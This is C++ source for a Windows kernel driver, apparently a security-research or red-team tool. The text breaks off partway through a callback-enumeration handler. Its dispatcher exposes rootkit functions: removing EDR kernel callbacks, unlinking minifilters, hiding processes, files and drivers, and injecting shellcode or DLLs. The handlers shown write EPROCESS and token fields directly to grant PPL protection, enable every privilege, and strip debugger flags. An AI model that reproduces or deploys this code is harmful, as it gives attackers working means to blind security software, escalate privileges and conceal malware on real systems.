#include "pch.h"
#include "DioProcessGlobals.h"
#include "Locker.h"
#include "Hypervisor/HvProtection.h"
#include "../Injection/EarlyInjection.h"
#include "../FileHide/FileHide.h"
#include "../DKOM/ProcessHide.h"
#include "../Memory/PhysicalMemory.h"

// Forward declaration for HandleCopyMemory
NTSTATUS HandleCopyMemory(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// ============== IOCTL Device Control Dispatcher ==============

NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	ULONG_PTR info = 0;

	switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_DIOPROCESS_REGISTER_CALLBACKS:
		status = HandleRegisterCallbacks(Irp);
		break;

	case IOCTL_DIOPROCESS_UNREGISTER_CALLBACKS:
		status = HandleUnregisterCallbacks(Irp);
		break;

	case IOCTL_DIOPROCESS_START_COLLECTION:
		status = HandleStartCollection(Irp);
		break;

	case IOCTL_DIOPROCESS_STOP_COLLECTION:
		status = HandleStopCollection(Irp);
		break;

	case IOCTL_DIOPROCESS_GET_COLLECTION_STATE:
		status = HandleGetCollectionState(Irp, &info);
		break;

	// Security Research IOCTLs
	case IOCTL_DIOPROCESS_PROTECT_PROCESS:
		status = HandleProtectProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_UNPROTECT_PROCESS:
		status = HandleUnprotectProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENABLE_PRIVILEGES:
		status = HandleEnablePrivileges(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_CLEAR_DEBUG_FLAGS:
		status = HandleClearDebugFlags(Irp, irpSp);
		break;

	// Callback Enumeration IOCTLs
	case IOCTL_DIOPROCESS_ENUM_PROCESS_CALLBACKS:
		status = HandleEnumProcessCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_THREAD_CALLBACKS:
		status = HandleEnumThreadCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_IMAGE_CALLBACKS:
		status = HandleEnumImageCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_OBJECT_CALLBACKS:
		status = HandleEnumObjectCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_MINIFILTERS:
		status = HandleEnumMinifilters(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_UNLINK_MINIFILTER:
		status = HandleUnlinkMinifilter(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENUM_DRIVERS:
		status = HandleEnumDrivers(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_PSPCIDTABLE:
		status = HandleEnumPspCidTable(Irp, irpSp, &info);
		break;

	// Callback Removal IOCTLs
	case IOCTL_DIOPROCESS_REMOVE_PROCESS_CALLBACK:
		status = HandleRemoveProcessCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_THREAD_CALLBACK:
		status = HandleRemoveThreadCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_IMAGE_CALLBACK:
		status = HandleRemoveImageCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_OBJECT_CALLBACK:
		status = HandleRemoveObjectCallback(Irp, irpSp);
		break;

	// Registry Callback IOCTLs (RCK style)
	case IOCTL_DIOPROCESS_ENUM_REGISTRY_CALLBACKS:
		status = HandleEnumRegistryCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_REMOVE_REGISTRY_CALLBACK:
		status = HandleRemoveRegistryCallback(Irp, irpSp);
		break;

	// Callback Restore IOCTLs
	case IOCTL_DIOPROCESS_RESTORE_PROCESS_CALLBACK:
		status = HandleRestoreProcessCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_THREAD_CALLBACK:
		status = HandleRestoreThreadCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_IMAGE_CALLBACK:
		status = HandleRestoreImageCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_OBJECT_CALLBACK:
		status = HandleRestoreObjectCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_REGISTRY_CALLBACK:
		status = HandleRestoreRegistryCallback(Irp, irpSp);
		break;

	// Kernel Injection IOCTLs
	case IOCTL_DIOPROCESS_KERNEL_INJECT_SHELLCODE:
		status = HandleKernelInjectShellcode(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_KERNEL_INJECT_DLL:
		status = HandleKernelInjectDll(Irp, irpSp, &info);
		break;

	// Hypervisor Control IOCTLs
	case IOCTL_DIOPROCESS_HV_START:
		status = HandleHvStart(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_STOP:
		status = HandleHvStop(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_PING:
		status = HandleHvPing(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_INSTALL_HOOKS:
		status = HandleHvInstallHooks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_REMOVE_HOOKS:
		status = HandleHvRemoveHooks(Irp, irpSp, &info);
		break;

	// Hypervisor Process Protection IOCTLs
	case IOCTL_DIOPROCESS_HV_PROTECT_PROCESS:
		status = HandleHvProtectProcess(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_UNPROTECT_PROCESS:
		status = HandleHvUnprotectProcess(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_IS_PROCESS_PROTECTED:
		status = HandleHvIsProcessProtected(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_LIST_PROTECTED:
		status = HandleHvListProtected(Irp, irpSp, &info);
		break;

	// Hypervisor Driver Hiding IOCTLs
	case IOCTL_DIOPROCESS_HV_HIDE_DRIVER:
		status = HandleHvHideDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_UNHIDE_DRIVER:
		status = HandleHvUnhideDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_IS_DRIVER_HIDDEN:
		status = HandleHvIsDriverHidden(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER:
		status = HandleHvRemoveHiddenDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS:
		status = HandleHvClearHiddenDrivers(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS:
		status = HandleHvListHiddenDrivers(Irp, irpSp, &info);
		break;

	// Ring -1 Injection IOCTLs
	case IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE:
		status = HandleHvInjectShellcode(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_INJECT_DLL:
		status = HandleHvInjectDll(Irp, irpSp, &info);
		break;

	// Early Injection IOCTLs
	case IOCTL_DIOPROCESS_EARLY_INJECT_ARM:
		status = HandleEarlyInjectArm(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_EARLY_INJECT_DISARM:
		status = HandleEarlyInjectDisarm(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_EARLY_INJECT_STATUS:
		status = HandleEarlyInjectStatus(Irp, irpSp, &info);
		break;

	// Kernel Memory Copy IOCTL (KsDumper-style)
	case IOCTL_DIOPROCESS_COPY_MEMORY:
		status = HandleCopyMemory(Irp, irpSp, &info);
		break;

	// File Hiding IOCTLs (Minifilter)
	case IOCTL_DIOPROCESS_FILEHIDE_HIDE:
		status = HandleFileHideHide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_FILEHIDE_UNHIDE:
		status = HandleFileHideUnhide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_FILEHIDE_LIST:
		status = HandleFileHideList(Irp, irpSp, &info);
		break;

	// DKOM Process Hiding IOCTLs
	case IOCTL_DIOPROCESS_PROCESS_HIDE:
		status = HandleProcessHide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PROCESS_UNHIDE:
		status = HandleProcessUnhide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PROCESS_HIDE_LIST:
		status = HandleProcessHideList(Irp, irpSp, &info);
		break;

	// Physical Memory IOCTLs
	case IOCTL_DIOPROCESS_TRANSLATE_VA:
		status = HandleTranslateVA(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_READ_PHYSICAL:
		status = HandleReadPhysical(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_WRITE_PHYSICAL:
		status = HandleWritePhysical(Irp, irpSp, &info);
		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	return CompleteRequest(Irp, status, info);
}

// ============== Collection Control Handlers ==============

NTSTATUS HandleRegisterCallbacks(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);

	if (g_CallbacksRegistered)
	{
		KdPrint((DRIVER_PREFIX "Callbacks already registered\n"));
		return STATUS_ALREADY_REGISTERED;
	}

	NTSTATUS status;

	// Register process callback
	status = PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, FALSE);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register process callback (0x%X)\n", status));
		return status;
	}
	KdPrint((DRIVER_PREFIX "Process callback registered\n"));

	// Register thread callback
	status = PsSetCreateThreadNotifyRoutine(OnThreadCallback);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register thread callback (0x%X)\n", status));
		PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
		return status;
	}
	KdPrint((DRIVER_PREFIX "Thread callback registered\n"));

	// Register image load callback
	status = PsSetLoadImageNotifyRoutine(OnImageLoadCallback);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register image load callback (0x%X)\n", status));
		PsRemoveCreateThreadNotifyRoutine(OnThreadCallback);
		PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
		return status;
	}
	KdPrint((DRIVER_PREFIX "Image load callback registered\n"));

	// Register Object Manager callbacks
	OB_CALLBACK_REGISTRATION obCallbackReg = { 0 };
	OB_OPERATION_REGISTRATION obOpReg[2] = { 0 };

	obOpReg[0].ObjectType = PsProcessType;
	obOpReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	obOpReg[0].PreOperation = OnPreProcessHandleOperation;
	obOpReg[0].PostOperation = nullptr;

	obOpReg[1].ObjectType = PsThreadType;
	obOpReg[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	obOpReg[1].PreOperation = OnPreThreadHandleOperation;
	obOpReg[1].PostOperation = nullptr;

	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"321000");
	obCallbackReg.Version = OB_FLT_REGISTRATION_VERSION;
	obCallbackReg.OperationRegistrationCount = 2;
	obCallbackReg.Altitude = altitude;
	obCallbackReg.RegistrationContext = nullptr;
	obCallbackReg.OperationRegistration = obOpReg;

	status = ObRegisterCallbacks(&obCallbackReg, &g_ObCallbackHandle);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register OB callbacks (0x%X)\n", status));
		// Continue without OB callbacks
		status = STATUS_SUCCESS;
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Object Manager callbacks registered\n"));
	}

	// Register registry callback
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(L"321001");
	PDRIVER_OBJECT driverObj = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
	NTSTATUS regStatus = CmRegisterCallbackEx(OnRegistryCallback, &regAltitude, driverObj, nullptr, &g_RegistryCookie, nullptr);
	if (!NT_SUCCESS(regStatus))
	{
		KdPrint((DRIVER_PREFIX "Failed to register registry callback (0x%X)\n", regStatus));
		// Continue without registry callbacks
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Registry callback registered\n"));
	}

	g_CallbacksRegistered = TRUE;
	KdPrint((DRIVER_PREFIX "All callbacks registered successfully\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnregisterCallbacks(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);

	if (!g_CallbacksRegistered)
	{
		KdPrint((DRIVER_PREFIX "Callbacks not registered\n"));
		return STATUS_SUCCESS;
	}

	// Unregister in reverse order
	if (g_RegistryCookie.QuadPart != 0)
	{
		CmUnRegisterCallback(g_RegistryCookie);
		g_RegistryCookie.QuadPart = 0;
		KdPrint((DRIVER_PREFIX "Registry callback unregistered\n"));
	}

	if (g_ObCallbackHandle)
	{
		ObUnRegisterCallbacks(g_ObCallbackHandle);
		g_ObCallbackHandle = nullptr;
		KdPrint((DRIVER_PREFIX "Object Manager callbacks unregistered\n"));
	}

	PsRemoveLoadImageNotifyRoutine(OnImageLoadCallback);
	KdPrint((DRIVER_PREFIX "Image load callback unregistered\n"));

	PsRemoveCreateThreadNotifyRoutine(OnThreadCallback);
	KdPrint((DRIVER_PREFIX "Thread callback unregistered\n"));

	PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
	KdPrint((DRIVER_PREFIX "Process callback unregistered\n"));

	g_CallbacksRegistered = FALSE;
	g_State.CollectionEnabled = FALSE;
	KdPrint((DRIVER_PREFIX "All callbacks unregistered\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleStartCollection(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);
	g_State.CollectionEnabled = TRUE;
	KdPrint((DRIVER_PREFIX "Collection started\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleStopCollection(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);
	g_State.CollectionEnabled = FALSE;
	KdPrint((DRIVER_PREFIX "Collection stopped\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleGetCollectionState(PIRP Irp, PULONG_PTR info)
{
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(CollectionStateResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (CollectionStateResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsCollecting = g_State.CollectionEnabled;
	response->ItemCount = g_State.ItemCount;
	*info = sizeof(CollectionStateResponse);
	return STATUS_SUCCESS;
}

// ============== Security Research Handlers ==============

NTSTATUS HandleProtectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for process protection\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Protecting process PID %d (EPROCESS=0x%p, Offset=0x%X)\n",
		request->ProcessId, eProcess, PROCESS_PROTECTION_OFFSET[windowsVersion]));

	// Get protection structure pointer
	PROCESS_PROTECTION_INFO* psProtection =
		(PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);

	// Read current protection values for logging
	KdPrint((DRIVER_PREFIX "Current Protection: SigLvl=0x%02X, SectSigLvl=0x%02X, Type=%d, Signer=%d\n",
		psProtection->SignatureLevel, psProtection->SectionSignatureLevel,
		psProtection->Protection.Type, psProtection->Protection.Signer));

	// Set protection values (PPL WinTcb-Light)
	psProtection->SignatureLevel = 0x3E;          // SE_SIGNING_LEVEL_WINDOWS_TCB
	psProtection->SectionSignatureLevel = 0x3C;   // SE_SIGNING_LEVEL_WINDOWS
	psProtection->Protection.Type = 2;            // PsProtectedTypeProtectedLight
	psProtection->Protection.Signer = 6;          // PsProtectedSignerWinTcb

	KdPrint((DRIVER_PREFIX "New Protection: SigLvl=0x%02X, SectSigLvl=0x%02X, Type=%d, Signer=%d\n",
		psProtection->SignatureLevel, psProtection->SectionSignatureLevel,
		psProtection->Protection.Type, psProtection->Protection.Signer));

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Process PID %d protected successfully\n", request->ProcessId));
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnprotectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for process unprotection\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Removing protection from process PID %d\n", request->ProcessId));

	// Get protection structure pointer
	PROCESS_PROTECTION_INFO* psProtection =
		(PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);

	// Zero out protection
	psProtection->SignatureLevel = 0;
	psProtection->SectionSignatureLevel = 0;
	psProtection->Protection.Type = 0;
	psProtection->Protection.Signer = 0;
	psProtection->Protection.Audit = 0;

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Process PID %d unprotected successfully\n", request->ProcessId));
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnablePrivileges(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for privilege manipulation\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Enabling all privileges for process PID %d\n", request->ProcessId));

	// Get primary token
	PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
	if (!pToken)
	{
		ObDereferenceObject(eProcess);
		KdPrint((DRIVER_PREFIX "PsReferencePrimaryToken failed\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Get privileges structure pointer
	PPROCESS_PRIVILEGES tokenPrivs =
		(PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[windowsVersion]);

	// Enable all privileges
	tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = tokenPrivs->EnabledByDefault[0] = 0xff;
	tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = tokenPrivs->EnabledByDefault[1] = 0xff;
	tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = tokenPrivs->EnabledByDefault[2] = 0xff;
	tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = tokenPrivs->EnabledByDefault[3] = 0xff;
	tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = tokenPrivs->EnabledByDefault[4] = 0xff;

	PsDereferencePrimaryToken(pToken);
	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "All privileges enabled for PID %d\n", request->ProcessId));
	return STATUS_SUCCESS;
}

NTSTATUS HandleClearDebugFlags(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for anti-debug\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Clearing debug flags for process PID %d\n", request->ProcessId));

	// 1. Clear DebugPort in EPROCESS (kernel debugger detection)
	PVOID* pDebugPort = (PVOID*)((ULONG_PTR)eProcess + PROCESS_DEBUGPORT_OFFSET[windowsVersion]);
	PVOID oldDebugPort = *pDebugPort;
	*pDebugPort = NULL;
	KdPrint((DRIVER_PREFIX "DebugPort cleared (was: 0x%p, now: NULL)\n", oldDebugPort));

	// 2. Get PEB from EPROCESS
	PVOID pPeb = *(PVOID*)((ULONG_PTR)eProcess + PROCESS_PEB_OFFSET[windowsVersion]);
	if (pPeb && (ULONG_PTR)pPeb > 0x1000 && (ULONG_PTR)pPeb < 0x7FFFFFFFFFFF)  // Sanity check: valid usermode address
	{
		// Attach to target process context to safely access PEB
		KAPC_STATE apcState;
		KeStackAttachProcess(eProcess, &apcState);

		__try
		{
			// PEB.BeingDebugged is at offset 0x002
			PUCHAR pBeingDebugged = (PUCHAR)((ULONG_PTR)pPeb + 0x002);
			UCHAR oldBeingDebugged = *pBeingDebugged;
			*pBeingDebugged = FALSE;
			KdPrint((DRIVER_PREFIX "PEB.BeingDebugged cleared (was: %d, now: 0)\n", oldBeingDebugged));

			// PEB.NtGlobalFlag is at offset 0x0BC (x64) or 0x068 (x86)
			// Clearing heap debugging flags
#ifdef _WIN64
			PULONG pNtGlobalFlag = (PULONG)((ULONG_PTR)pPeb + 0x0BC);
#else
			PULONG pNtGlobalFlag = (PULONG)((ULONG_PTR)pPeb + 0x068);
#endif
			ULONG oldNtGlobalFlag = *pNtGlobalFlag;
			// Clear heap debug flags (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
			*pNtGlobalFlag &= ~(0x10 | 0x20 | 0x40);
			KdPrint((DRIVER_PREFIX "PEB.NtGlobalFlag cleared (was: 0x%X, now: 0x%X)\n",
				oldNtGlobalFlag, *pNtGlobalFlag));
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception while accessing PEB (0x%08X)\n", GetExceptionCode()));
			status = STATUS_ACCESS_VIOLATION;
		}

		KeUnstackDetachProcess(&apcState);
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Warning: Invalid PEB address (0x%p)\n", pPeb));
	}

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Anti-debug completed for PID %d\n", request->ProcessId));
	return status;
}

// ============== Callback Enumeration Handlers ==============

NTSTATUS HandleEnumProcessCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating process callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for callback enumeration\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Find the callback array
	ULONG64 pspSetCreateProcessNotifyArray = FindPspSetCreateProcessNotifyRoutine(windowsVersion);
	if (pspSetCreateProcessNotifyArray == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to locate callback array\n"));
		return STATUS_NOT_FOUND;
	}

	// Zero the output buffer
	RtlZeroMemory(userBuffer, requiredSize);

	// Enumerate all 64 callback slots (PCKC style)
	ULONG validCallbackCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		// Each callback is 8 bytes (pointer) on x64
		ULONG64 pCallbackSlot = pspSetCreateProcessNotifyArray + (i * 8);
		ULONG64 callbackEntry = 0;

		__try
		{
			callbackEntry = *(PULONG64)(pCallbackSlot);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception reading callback slot %d\n", i));
			continue;
		}

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (PCKC style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Windows stores callbacks with flags in low 3 bits
		// Clear the flags to get the actual structure pointer (PCKC style)
		ULONG64 callbackStructure = callbackEntry & 0xFFFFFFFFFFFFFFF8;

		// The structure points to an EX_CALLBACK_ROUTINE_BLOCK
		// The actual function pointer is at offset 0x0 in this structure
		ULONG64 actualCallbackFunction = 0;

		__try
		{
			// Dereference the structure to get the actual callback function
			actualCallbackFunction = *(PULONG64)(callbackStructure);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception dereferencing callback structure at 0x%llX\n", callbackStructure));
			// Store the structure address as fallback
			actualCallbackFunction = callbackStructure;
		}

		// Store the actual function address
		userBuffer[i].CallbackAddress = actualCallbackFunction;

		// Resolve which driver owns this callback
		SearchLoadedModules(&userBuffer[i]);

		validCallbackCount++;
		KdPrint((DRIVER_PREFIX "[%d] ProcessCallback: 0x%llX (%s+0x%llX)\n",
			i, actualCallbackFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active process callbacks\n", validCallbackCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumThreadCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating thread callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	ULONG64 callbackArray = FindPspCreateThreadNotifyRoutine(windowsVersion);
	if (callbackArray == 0)
	{
		return STATUS_NOT_FOUND;
	}

	RtlZeroMemory(userBuffer, requiredSize);

	ULONG validCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		ULONG64 callbackEntry = 0;
		__try { callbackEntry = *(PULONG64)(callbackArray + (i * 8)); }
		__except (EXCEPTION_EXECUTE_HANDLER) { continue; }

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (TCKC style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Mask off low 3 bits and dereference to get actual callback function (TCKC style)
		ULONG64 actualFunction = 0;
		__try { actualFunction = *(PULONG64)(callbackEntry & 0xFFFFFFFFFFFFFFF8); }
		__except (EXCEPTION_EXECUTE_HANDLER) { actualFunction = callbackEntry & 0xFFFFFFFFFFFFFFF8; }

		userBuffer[i].CallbackAddress = actualFunction;
		SearchLoadedModules(&userBuffer[i]);
